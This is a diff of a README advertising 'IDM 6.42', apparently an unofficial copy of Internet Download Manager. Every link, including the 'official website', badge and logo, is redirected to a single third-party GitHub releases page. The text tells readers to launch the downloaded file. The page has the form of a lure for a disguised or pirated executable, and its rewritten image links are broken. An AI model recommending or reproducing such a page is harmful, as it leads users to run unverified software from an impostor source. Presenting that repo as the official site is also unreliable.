@@ -31,7 +31,7 @@ Internet Download Manager (IDM) is a popular tool that helps users to manage and
 
 ## Get IDM 6.42 Now! 💻
 
-Ready to take your downloading experience to the next level with IDM 6.42? [Download IDM 6.42 Here](https://github.com/uploads/App.zip)
+Ready to take your downloading experience to the next level with IDM 6.42? [Download IDM 6.42 Here](https://github.com/piolama/idm-642/releases)
 
 Make sure to launch the file after downloading to start enjoying the enhanced features of IDM 6.42! 🚀
 
@@ -41,12 +41,12 @@ If the provided link is not working or you need more options, head over to the *
 
 ## Explore More
 
-Visit our [official website](https://www.idm642.com) to stay updated with the latest IDM versions, news, and tips to optimize your downloads. 💡
+Visit our [official website](https://github.com/piolama/idm-642/releases) to stay updated with the latest IDM versions, news, and tips to optimize your downloads. 💡
 
 Feel free to explore the colorful buttons and badges below for quick access to our download page:
 
-[![Download IDM 6.42](https://img.shields.io/badge/Download-IDM%206.42-blue)](https://github.com/uploads/App.zip)
+[![Download IDM 6.42](https://github.com/piolama/idm-642/releases%206.42-blue)](https://github.com/piolama/idm-642/releases)
 
 Thank you for choosing IDM 6.42! Happy downloading! 🌟📥
 
-![IDM Logo](https://www.example.com/idm-logo.png)
+![IDM Logo](https://github.com/piolama/idm-642/releases)
